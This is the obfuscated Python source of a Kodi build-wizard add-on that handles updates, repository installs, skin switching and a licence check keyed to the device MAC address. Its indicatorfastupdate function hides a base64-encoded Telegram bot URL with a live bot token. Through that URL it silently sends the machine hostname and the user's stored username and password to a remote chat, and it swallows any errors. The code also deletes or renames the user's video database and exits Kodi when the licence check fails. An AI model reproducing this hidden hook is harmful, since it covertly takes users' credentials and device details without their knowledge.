# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob #line:21
import shutil #line:22
import urllib2 ,urllib #line:23
import re #line:24
import uservar #line:25
import time #line:26
import json #line:27
import speedtest #line:28
from shutil import copyfile #line:29
from datetime import date ,datetime ,timedelta #line:30
from resources .libs import extract ,downloader ,downloaderbg ,downloaderwiz ,notify ,loginit ,debridit ,traktit ,maintenance ,skinSwitch ,uploadLog ,wizard as wiz #line:31
ADDON_ID =uservar .ADDON_ID #line:33
ADDONTITLE =uservar .ADDONTITLE #line:34
ADDON =wiz .addonId (ADDON_ID )#line:35
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:36
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:37
ADDONID =wiz .addonInfo (ADDON_ID ,'id')#line:38
DIALOG =xbmcgui .Dialog ()#line:39
DP =xbmcgui .DialogProgress ()#line:40
DP2 =xbmcgui .DialogProgressBG ()#line:41
HOME =xbmc .translatePath ('special://home/')#line:42
PROFILE =xbmc .translatePath ('special://profile/')#line:43
KODIHOME =xbmc .translatePath ('special://xbmc/')#line:44
ADDONS =os .path .join (HOME ,'addons')#line:45
KODIADDONS =os .path .join (KODIHOME ,'addons')#line:46
USERDATA =os .path .join (HOME ,'userdata')#line:47
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:48
PACKAGES =os .path .join (ADDONS ,'packages')#line:49
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:50
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:51
ICON =os .path .join (ADDONPATH ,'icon.png')#line:52
ART =os .path .join (ADDONPATH ,'resources','art')#line:53
SKIN =xbmc .getSkinDir ()#line:54
BUILDNAME =wiz .getS ('buildname')#line:55
DEFAULTSKIN =wiz .getS ('defaultskin')#line:56
DEFAULTNAME =wiz .getS ('defaultskinname')#line:57
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:58
BUILDVERSION =wiz .getS ('buildversion')#line:59
BUILDLATEST =wiz .getS ('latestversion')#line:60
BUILDCHECK =wiz .getS ('lastbuildcheck')#line:61
DISABLEUPDATE =wiz .getS ('disableupdate')#line:62
AUTOCLEANUP =wiz .getS ('autoclean')#line:63
AUTOCACHE =wiz .getS ('clearcache')#line:64
AUTOPACKAGES =wiz .getS ('clearpackages')#line:65
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:66
AUTOFEQ =wiz .getS ('autocleanfeq')#line:67
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:68
TRAKTSAVE =wiz .getS ('traktlastsave')#line:69
REALSAVE =wiz .getS ('debridlastsave')#line:70
LOGINSAVE =wiz .getS ('loginlastsave')#line:71
INSTALLMETHOD =wiz .getS ('installmethod')#line:72
KEEPTRAKT =wiz .getS ('keeptrakt')#line:73
KEEPREAL =wiz .getS ('keepdebrid')#line:74
KEEPLOGIN =wiz .getS ('keeplogin')#line:75
INSTALLED =wiz .getS ('installed')#line:76
EXTRACT =wiz .getS ('extract')#line:77
EXTERROR =wiz .getS ('errors')#line:78
NOTIFY =wiz .getS ('notify')#line:79
NOTEDISMISS =wiz .getS ('notedismiss')#line:80
NOTEID =wiz .getS ('noteid')#line:81
NOTIFY2 =wiz .getS ('notify2')#line:82
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:83
NOTEID2 =wiz .getS ('noteid2')#line:84
NOTIFY3 =wiz .getS ('notify3')#line:85
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:86
NOTEID3 =wiz .getS ('noteid3')#line:87
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else HOME #line:88
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:89
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:90
NOTEID2 =0 if NOTEID2 ==""else int (NOTEID2 )#line:91
NOTEID3 =0 if NOTEID3 ==""else int (NOTEID3 )#line:92
AUTOFEQ =int (AUTOFEQ )if AUTOFEQ .isdigit ()else 1 #line:93
TODAY =date .today ()#line:94
TOMORROW =TODAY +timedelta (days =1 )#line:95
TWODAYS =TODAY +timedelta (days =2 )#line:96
THREEDAYS =TODAY +timedelta (days =3 )#line:97
ONEWEEK =TODAY +timedelta (days =7 )#line:98
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:99
EXCLUDES =uservar .EXCLUDES #line:100
SPEEDFILE =speedtest .SPEEDFILE #line:101
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:102
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:103
NOTIFICATION =uservar .NOTIFICATION #line:104
NOTIFICATION2 =uservar .NOTIFICATION2 #line:105
NOTIFICATION3 =uservar .NOTIFICATION3 #line:106
ENABLE =uservar .ENABLE #line:107
UNAME =speedtest .UNAME #line:108
HEADERMESSAGE =uservar .HEADERMESSAGE #line:109
AUTOUPDATE =uservar .AUTOUPDATE #line:110
WIZARDFILE =uservar .WIZARDFILE #line:111
AUTOINSTALL =uservar .AUTOINSTALL #line:112
REPOID =uservar .REPOID #line:113
REPOADDONXML =uservar .REPOADDONXML #line:114
REPOZIPURL =uservar .REPOZIPURL #line:115
REPOID18 =uservar .REPOID18 #line:116
REPOADDONXML18 =uservar .REPOADDONXML18 #line:117
REPOZIPURL18 =uservar .REPOZIPURL18 #line:118
COLOR1 =uservar .COLOR1 #line:119
COLOR2 =uservar .COLOR2 #line:120
TMDB_NEW_API =uservar .TMDB_NEW_API #line:121
WORKING =True if wiz .workingURL (SPEEDFILE )==True else False #line:122
FAILED =False #line:123
xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:124
AddonID ='plugin.program.Anonymous'#line:126
packagesdir =xbmc .translatePath (os .path .join ('special://home/addons/packages',''))#line:127
thumbnails =xbmc .translatePath ('special://home/userdata/Thumbnails')#line:128
dialog =xbmcgui .Dialog ()#line:129
setting =xbmcaddon .Addon ().getSetting #line:130
iconpath =xbmc .translatePath (os .path .join ('special://home/addons/'+AddonID ,'icon.png'))#line:131
notify_mode =setting ('notify_mode')#line:132
auto_clean =setting ('startup.cache')#line:133
filesize_thumb =int (setting ('filesizethumb_alert'))#line:135
total_size2 =0 #line:138
total_size =0 #line:139
count =0 #line:140
def disply_hwr ():#line:142
   O00O0O000O00OOOOO =tmdb_list (TMDB_NEW_API )#line:143
   OOOOO00000O0OOOOO =str ((getHwAddr ('eth0'))*O00O0O000O00OOOOO )#line:144
   OOOO00OOOOO00O00O =(OOOOO00000O0OOOOO [1 ]+OOOOO00000O0OOOOO [2 ]+OOOOO00000O0OOOOO [5 ]+OOOOO00000O0OOOOO [7 ])#line:151
   O000O0O0OO000O0OO =(ADDON .getSetting ("action"))#line:152
   wiz .setS ('action',str (OOOO00OOOOO00O00O ))#line:154
def getHwAddr (OOO000000OO0OOOOO ):#line:155
   import subprocess ,time #line:156
   OO0OOOO0O0OOOOO00 ='windows'#line:157
   if xbmc .getCondVisibility ('system.platform.android'):#line:158
       OO0OOOO0O0OOOOO00 ='android'#line:159
   if xbmc .getCondVisibility ('system.platform.android'):#line:160
     O0O00O0O0O00OOO00 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:161
     O0OO000O0O00O0OO0 =re .compile ('link/ether (.+?) brd').findall (str (O0O00O0O0O00OOO00 ))#line:163
     O00000O0OOOO00OOO =0 #line:164
     for O0000000OO00OOO0O in O0OO000O0O00O0OO0 :#line:165
      if O0OO000O0O00O0OO0 !='00:00:00:00:00:00':#line:166
          O000OOOO0OO0O0OO0 =O0000000OO00OOO0O #line:167
          O00000O0OOOO00OOO =O00000O0OOOO00OOO +int (O000OOOO0OO0O0OO0 .replace (':',''),16 )#line:168
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:170
       O0O0O0000O0OOO00O =0 #line:171
       O00000O0OOOO00OOO =0 #line:172
       O0OOO00OOO0000000 =[]#line:173
       OO000OOOOOOOO0O0O =os .popen ("getmac").read ()#line:174
       OO000OOOOOOOO0O0O =OO000OOOOOOOO0O0O .split ("\n")#line:175
       for OOO0O00O00000OOOO in OO000OOOOOOOO0O0O :#line:177
            O0O0OO00O0O000OO0 =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OOO0O00O00000OOOO ,re .I )#line:178
            if O0O0OO00O0O000OO0 :#line:179
                O0OO000O0O00O0OO0 =O0O0OO00O0O000OO0 .group ().replace ('-',':')#line:180
                O0OOO00OOO0000000 .append (O0OO000O0O00O0OO0 )#line:181
                O00000O0OOOO00OOO =O00000O0OOOO00OOO +int (O0OO000O0O00O0OO0 .replace (':',''),16 )#line:184
   else :#line:186
       O0O0O0000O0OOO00O =0 #line:187
       O00000O0OOOO00OOO =0 #line:188
       while (1 ):#line:189
         O000OOOO0OO0O0OO0 =xbmc .getInfoLabel ("network.macaddress")#line:190
         logging .warning (O000OOOO0OO0O0OO0 )#line:191
         if O000OOOO0OO0O0OO0 !="Busy"and O000OOOO0OO0O0OO0 !=' עסוק':#line:192
            break #line:194
         else :#line:195
           O0O0O0000O0OOO00O =O0O0O0000O0OOO00O +1 #line:196
           time .sleep (1 )#line:197
           if O0O0O0000O0OOO00O >30 :#line:198
            break #line:199
       O00000O0OOOO00OOO =O00000O0OOOO00OOO +int (O000OOOO0OO0O0OO0 .replace (':',''),16 )#line:200
   return O00000O0OOOO00OOO #line:202
def decode (O0OOO00000O00O0O0 ,O0OO00O0O00OOO0O0 ):#line:203
    import base64 #line:204
    O0O00OO0O0O00OOOO =[]#line:205
    if (len (O0OOO00000O00O0O0 ))!=4 :#line:207
     return 10 #line:208
    O0OO00O0O00OOO0O0 =base64 .urlsafe_b64decode (O0OO00O0O00OOO0O0 )#line:209
    for O0O000O0OOO0OOO00 in range (len (O0OO00O0O00OOO0O0 )):#line:211
        OOOOOOOO0OOOO000O =O0OOO00000O00O0O0 [O0O000O0OOO0OOO00 %len (O0OOO00000O00O0O0 )]#line:212
        O00OOO00OO00O00OO =chr ((256 +ord (O0OO00O0O00OOO0O0 [O0O000O0OOO0OOO00 ])-ord (OOOOOOOO0OOOO000O ))%256 )#line:213
        O0O00OO0O0O00OOOO .append (O00OOO00OO00O00OO )#line:214
    return "".join (O0O00OO0O0O00OOOO )#line:215
def tmdb_list (OOO00000OOOO0OO0O ):#line:216
    O000O0O000O0OO0OO =decode ("7643",OOO00000OOOO0OO0O )#line:219
    return int (O000O0O000O0OO0OO )#line:222
def u_list (OOO0000000OO0OOO0 ):#line:223
    from math import sqrt #line:225
    OOOOO00OO00O0O0O0 =tmdb_list (TMDB_NEW_API )#line:226
    O00000O00000000OO =str ((getHwAddr ('eth0'))*OOOOO00OO00O0O0O0 )#line:228
    O0O00OO000O00OO0O =int (O00000O00000000OO [1 ]+O00000O00000000OO [2 ]+O00000O00000000OO [5 ]+O00000O00000000OO [7 ])#line:229
    OO0000OOO0OO000O0 =(ADDON .getSetting ("pass"))#line:231
    O00OO000000OO0OO0 =(str (round (sqrt ((O0O00OO000O00OO0O *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:236
    if '.'in O00OO000000OO0OO0 :#line:237
     O00OO000000OO0OO0 =(str (round (sqrt ((O0O00OO000O00OO0O *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:238
    if OO0000OOO0OO000O0 ==O00OO000000OO0OO0 :#line:239
      OOO0O0O0000000O00 =OOO0000000OO0OOO0 #line:241
    else :#line:243
       if STARTP ()and STARTP2 ()=='ok':#line:244
         return OOO0000000OO0OOO0 #line:246
       OOO0O0O0000000O00 ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:247
       xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:248
       sys .exit ()#line:249
    return OOO0O0O0000000O00 #line:250
try :#line:251
   disply_hwr ()#line:252
except :#line:253
   pass #line:254
def indicatorfastupdate ():#line:256
       try :#line:257
          import json #line:258
          wiz .log ('FRESH MESSAGE')#line:259
          O00000O00O0000000 =(ADDON .getSetting ("user"))#line:260
          O0O0OO0000O00OOO0 =(ADDON .getSetting ("pass"))#line:261
          O00OOOO000OOO0000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:263
          O0O000OOO0O00O00O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:264
          O0OO0OOO000O00O0O =O00000O00O0000000 #line:266
          OO00OO0O0O00O00OO =O0O0OO0000O00OOO0 #line:267
          import socket #line:268
          O0O000OOO0O00O00O =urllib2 .urlopen (O00OOOO000OOO0000 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0OO0OOO000O00O0O +' - '+OO00OO0O0O00O00OO ).readlines ()#line:269
       except :pass #line:271
def checkidupdate ():#line:272
				wiz .setS ("notedismiss","true")#line:274
				O00O00OO0OOOOOO0O =wiz .workingURL (NOTIFICATION )#line:275
				OO00OO0O0OOOO0O0O =" Kodi Premium"#line:277
				O00000O00O0O00OO0 =wiz .checkBuild (OO00OO0O0OOOO0O0O ,'gui')#line:278
				OOOOO0O0OO00OO00O =OO00OO0O0OOOO0O0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:279
				if not wiz .workingURL (O00000O00O0O00OO0 )==True :return #line:280
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:281
				O000OOOOO0000OOO0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOOO0O0OO00OO00O )#line:284
				try :os .remove (O000OOOOO0000OOO0 )#line:285
				except :pass #line:286
				if 'google'in O00000O00O0O00OO0 :#line:288
				   OOOOO00O00OO00O0O =googledrive_download (O00000O00O0O00OO0 ,O000OOOOO0000OOO0 ,DP2 ,wiz .checkBuild (OO00OO0O0OOOO0O0O ,'filesize'))#line:289
				else :#line:292
				  downloaderbg .download3 (O00000O00O0O00OO0 ,O000OOOOO0000OOO0 ,DP2 )#line:293
				xbmc .sleep (100 )#line:294
				DP2 .create ('[B][COLOR=green]מתקין                         [/COLOR][/B]')#line:295
				DP2 .update (100 ,message ='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')#line:297
				extract .all (O000OOOOO0000OOO0 ,HOME )#line:299
				DP2 .close ()#line:300
				wiz .defaultSkin ()#line:301
				wiz .lookandFeelData ('save')#line:302
				wiz .kodi17Fix ()#line:303
				xbmc .executebuiltin ("ReloadSkin()")#line:304
				indicatorfastupdate ()#line:305
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:306
				debridit .debridIt ('restore','all')#line:307
				traktit .traktIt ('restore','all')#line:308
				if INSTALLMETHOD ==1 :O00O00OO0OOOOO0O0 =1 #line:309
				elif INSTALLMETHOD ==2 :O00O00OO0OOOOO0O0 =0 #line:310
				else :DP2 .close ()#line:311
def checkUpdate ():#line:317
	OOO0OO00O0000O0O0 =wiz .getS ('buildname')#line:318
	O0O00O00OO0OOOO00 =wiz .getS ('buildversion')#line:319
	O0O0OOO00000O0000 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:320
	O00O00O00000OO000 =re .compile ('name="%s".+?ersion="(.+?)".+?con="(.+?)".+?anart="(.+?)"'%OOO0OO00O0000O0O0 ).findall (O0O0OOO00000O0000 )#line:321
	if len (O00O00O00000OO000 )>0 :#line:322
		OO00000000O00O0OO =O00O00O00000OO000 [0 ][0 ]#line:323
		OOO0O00O000OOOOOO =O00O00O00000OO000 [0 ][1 ]#line:324
		O0O00OOOO000OOOOO =O00O00O00000OO000 [0 ][2 ]#line:325
		wiz .setS ('latestversion',OO00000000O00O0OO )#line:326
		if OO00000000O00O0OO >O0O00O00OO0OOOO00 :#line:327
			if DISABLEUPDATE =='false':#line:328
				wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Opening Update Window"%(O0O00O00OO0OOOO00 ,OO00000000O00O0OO ),xbmc .LOGNOTICE )#line:329
				notify .updateWindow (OOO0OO00O0000O0O0 ,O0O00O00OO0OOOO00 ,OO00000000O00O0OO ,OOO0O00O000OOOOOO ,O0O00OOOO000OOOOO )#line:330
			else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Update Window Disabled"%(O0O00O00OO0OOOO00 ,OO00000000O00O0OO ),xbmc .LOGNOTICE )#line:331
		else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s]"%(O0O00O00OO0OOOO00 ,OO00000000O00O0OO ),xbmc .LOGNOTICE )#line:332
	else :wiz .log ("[Check Updates] ERROR: Unable to find build version in build text file",xbmc .LOGERROR )#line:333
wiz .log ("[Auto Update Wizard] Started",xbmc .LOGNOTICE )#line:368
if AUTOUPDATE =='Yes':#line:369
	input =(ADDON .getSetting ("autoupdate"))#line:370
	xbmc .executebuiltin ("UpdateLocalAddons")#line:371
	xbmc .executebuiltin ("UpdateAddonRepos")#line:372
	wiz .wizardUpdate ('startup')#line:373
	checkUpdate ()#line:375
else :wiz .log ("[Auto Update Wizard] Not Enabled",xbmc .LOGNOTICE )#line:377
wiz .log ("[Auto Install Repo] Started",xbmc .LOGNOTICE )#line:381
if AUTOINSTALL =='Yes'and not os .path .exists (os .path .join (ADDONS ,REPOID ))and KODIV >=17 and KODIV <18 :#line:382
	xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','Please Wait....')))#line:383
	workingxml =wiz .workingURL (REPOADDONXML )#line:384
	if workingxml ==True :#line:385
		ver =wiz .parseDOM (wiz .openURL (REPOADDONXML ),'addon',ret ='version',attrs ={'id':REPOID })#line:386
		if len (ver )>0 :#line:387
			installzip ='%s-%s.zip'%(REPOID ,ver [0 ])#line:388
			workingrepo =wiz .workingURL (REPOZIPURL +installzip )#line:389
			if workingrepo ==True :#line:390
				DP .create (ADDONTITLE ,'מוריד ממשק התקנה חדשני, אנא המתן....','','Please Wait')#line:391
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:392
				lib =os .path .join (PACKAGES ,installzip )#line:393
				try :os .remove (lib )#line:394
				except :pass #line:395
				downloader .download (REPOZIPURL +installzip ,lib ,DP )#line:396
				extract .all (lib ,ADDONS ,DP )#line:397
				try :#line:398
					f =open (os .path .join (ADDONS ,REPOID ,'addon.xml'),mode ='r');g =f .read ();f .close ()#line:399
					name =wiz .parseDOM (g ,'addon',ret ='name',attrs ={'id':REPOID })#line:400
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,name [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,REPOID ,'icon.png'))#line:401
				except :#line:402
					pass #line:403
				if KODIV >=17 :wiz .addonDatabase (REPOID ,1 )#line:404
				DP .close ()#line:405
				xbmc .sleep (500 )#line:406
				wiz .forceUpdate (True )#line:407
				wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:408
				xbmc .executebuiltin ("ReloadSkin()")#line:409
				xbmc .executebuiltin ("ActivateWindow(home)")#line:410
				f_play =(os .path .join (ADDONPATH ,'resources','victory.mp4'))#line:411
				xbmc .Player ().play (f_play ,windowed =False )#line:412
			else :#line:414
				wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:415
				wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%workingrepo ,xbmc .LOGERROR )#line:416
		else :#line:417
			wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:418
	else :#line:419
		wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:420
		wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:421
elif not AUTOINSTALL =='Yes':wiz .log ("[Auto Install Repo] Not Enabled",xbmc .LOGNOTICE )#line:422
elif os .path .exists (os .path .join (ADDONS ,REPOID )):wiz .log ("[Auto Install Repo] Repository already installed")#line:423
if AUTOINSTALL =='Yes'and not os .path .exists (os .path .join (ADDONS ,REPOID ))and KODIV >=18 :#line:426
	workingxml =wiz .workingURL (REPOADDONXML18 )#line:427
	xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','Please Wait....')))#line:428
	if BUILDNAME =="":#line:429
		try :#line:430
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db"))#line:431
		except :#line:432
				pass #line:433
	if workingxml ==True :#line:434
		ver =wiz .parseDOM (wiz .openURL (REPOADDONXML18 ),'addon',ret ='version',attrs ={'id':REPOID18 })#line:435
		if len (ver )>0 :#line:436
			installzip ='%s-%s.zip'%(REPOID18 ,ver [0 ])#line:437
			workingrepo =wiz .workingURL (REPOZIPURL18 +installzip )#line:438
			if workingrepo ==True :#line:439
				DP .create (ADDONTITLE ,'מוריד ממשק התקנה חדשני, אנא המתן....','','Please Wait')#line:440
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:441
				lib =os .path .join (PACKAGES ,installzip )#line:442
				try :os .remove (lib )#line:443
				except :pass #line:444
				downloader .download (REPOZIPURL18 +installzip ,lib ,DP )#line:445
				extract .all (lib ,ADDONS ,DP )#line:446
				try :#line:447
					f =open (os .path .join (ADDONS ,REPOID18 ,'addon.xml'),mode ='r');g =f .read ();f .close ()#line:448
					name =wiz .parseDOM (g ,'addon',ret ='name',attrs ={'id':REPOID18 })#line:449
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,name [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,REPOID18 ,'icon.png'))#line:450
				except :#line:451
					pass #line:452
				if KODIV >=17 :wiz .addonDatabase (REPOID18 ,1 )#line:453
				DP .close ()#line:454
				xbmc .sleep (500 )#line:455
				wiz .forceUpdate (True )#line:456
				wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:457
				xbmc .executebuiltin ("ReloadSkin()")#line:458
				xbmc .executebuiltin ("ActivateWindow(home)")#line:459
				f_play =(os .path .join (ADDONPATH ,'resources','victory.mp4'))#line:460
				xbmc .Player ().play (f_play ,windowed =False )#line:461
			else :#line:463
				wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:464
				wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%workingrepo ,xbmc .LOGERROR )#line:465
		else :#line:466
			wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:467
	else :#line:468
		wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:469
		wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:470
elif not AUTOINSTALL =='Yes':wiz .log ("[Auto Install Repo] Not Enabled",xbmc .LOGNOTICE )#line:472
elif os .path .exists (os .path .join (ADDONS ,REPOID18 )):wiz .log ("[Auto Install Repo] Repository already installed")#line:473
def setuname ():#line:474
    OO0O0OOOO00OOO00O =''#line:475
    O00OO0000OO00O0O0 =xbmc .Keyboard (OO0O0OOOO00OOO00O ,'הכנס שם משתמש')#line:476
    O00OO0000OO00O0O0 .doModal ()#line:477
    if O00OO0000OO00O0O0 .isConfirmed ():#line:478
           OO0O0OOOO00OOO00O =O00OO0000OO00O0O0 .getText ()#line:479
           wiz .setS ('user',str (OO0O0OOOO00OOO00O ))#line:480
def STARTP2 ():#line:481
	if BUILDNAME ==" Kodi Premium":#line:482
		O000O0O00O000O00O =(ADDON .getSetting ("user"))#line:483
		OO00O0OO0OOO000OO =(UNAME )#line:484
		O0O000000OO000OOO =urllib2 .urlopen (OO00O0OO0OOO000OO )#line:485
		O0O00OOOOO000OOOO =O0O000000OO000OOO .readlines ()#line:486
		O0000O0OOOOOOO00O =0 #line:487
		for O0O0OOOOO00O0OOOO in O0O00OOOOO000OOOO :#line:488
			if O0O0OOOOO00O0OOOO .split (' ==')[0 ]==O000O0O00O000O00O or O0O0OOOOO00O0OOOO .split ()[0 ]==O000O0O00O000O00O :#line:489
				O0000O0OOOOOOO00O =1 #line:490
				break #line:491
		if O0000O0OOOOOOO00O ==0 :#line:492
			O0000000O0O0O0O00 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]ברוכים הבאים לקודי אנונימוס"%(COLOR2 ),"נא להכניס את שם המשתמש שלכם[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:494
			if O0000000O0O0O0O00 :#line:496
				ADDON .openSettings ()#line:497
				sys .exit ()#line:498
			else :#line:499
				sys .exit ()#line:500
		return 'ok'#line:504
def skinWIN ():#line:507
	idle ()#line:508
	OO000000O00000OOO =glob .glob (os .path .join (ADDONS ,'skin*'))#line:509
	O0000OOO000O00OO0 =[];OO0OOOOOOOOOOO0O0 =[]#line:510
	for OOOOO00O00O000O00 in sorted (OO000000O00000OOO ,key =lambda O0O0OOOOO0OOOO00O :O0O0OOOOO0OOOO00O ):#line:511
		OOOO0O0O0OOO00OO0 =os .path .split (OOOOO00O00O000O00 [:-1 ])[1 ]#line:512
		O00O000OO0OOO00OO =os .path .join (OOOOO00O00O000O00 ,'addon.xml')#line:513
		if os .path .exists (O00O000OO0OOO00OO ):#line:514
			OO00OO000O0OOO0O0 =open (O00O000OO0OOO00OO )#line:515
			OO0OO000OO00000OO =OO00OO000O0OOO0O0 .read ()#line:516
			OOOO000O0O00OO0O0 =parseDOM2 (OO0OO000OO00000OO ,'addon',ret ='id')#line:517
			O0O0OOO000OOO0O0O =OOOO0O0O0OOO00OO0 if len (OOOO000O0O00OO0O0 )==0 else OOOO000O0O00OO0O0 [0 ]#line:518
			try :#line:519
				OO00O0O0O0000OOO0 =xbmcaddon .Addon (id =O0O0OOO000OOO0O0O )#line:520
				O0000OOO000O00OO0 .append (OO00O0O0O0000OOO0 .getAddonInfo ('name'))#line:521
				OO0OOOOOOOOOOO0O0 .append (O0O0OOO000OOO0O0O )#line:522
			except :#line:523
				pass #line:524
	O0O000OO0OO0OO00O =[];OOO00O0O0O0O0000O =0 #line:525
	OOO0OO0000O000OOO =["Current Skin -- %s"%currSkin ()]+O0000OOO000O00OO0 #line:526
	OOO00O0O0O0O0000O =DIALOG .select ("Select the Skin you want to swap with.",OOO0OO0000O000OOO )#line:527
	if OOO00O0O0O0O0000O ==-1 :return #line:528
	else :#line:529
		O00OO00OO0O0OO0OO =(OOO00O0O0O0O0000O -1 )#line:530
		O0O000OO0OO0OO00O .append (O00OO00OO0O0OO0OO )#line:531
		OOO0OO0000O000OOO [OOO00O0O0O0O0000O ]="%s"%(O0000OOO000O00OO0 [O00OO00OO0O0OO0OO ])#line:532
	if O0O000OO0OO0OO00O ==None :return #line:533
	for O0O000O0O0OO0O0OO in O0O000OO0OO0OO00O :#line:534
		swapSkins (OO0OOOOOOOOOOO0O0 [O0O000O0O0OO0O0OO ])#line:535
def currSkin ():#line:537
	return xbmc .getSkinDir ('Container.PluginName')#line:538
def fix17update ():#line:540
	if KODIV >=17 and KODIV <18 :#line:541
		wiz .kodi17Fix ()#line:542
		xbmc .sleep (4000 )#line:543
		try :#line:544
			O0O00OO00O00O0000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:545
			O0O0O00OOOO00O0O0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:546
			os .rename (O0O00OO00O00O0000 ,O0O0O00OOOO00O0O0 )#line:547
		except :#line:548
				pass #line:549
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:550
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:551
		fixfont ()#line:552
		OO00O0O00000O000O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:553
		try :#line:555
			O0OO0O0OOO00OO000 =open (OO00O0O00000O000O ,'r')#line:556
			OOO0OOO0OOOOOO0O0 =O0OO0O0OOO00OO000 .read ()#line:557
			O0OO0O0OOO00OO000 .close ()#line:558
			OOO00OOOOO00000O0 ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:559
			OOO0O00OOOO000O0O =re .compile (OOO00OOOOO00000O0 ).findall (OOO0OOO0OOOOOO0O0 )[0 ]#line:560
			O0OO0O0OOO00OO000 =open (OO00O0O00000O000O ,'w')#line:561
			O0OO0O0OOO00OO000 .write (OOO0OOO0OOOOOO0O0 .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%OOO0O00OOOO000O0O ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:562
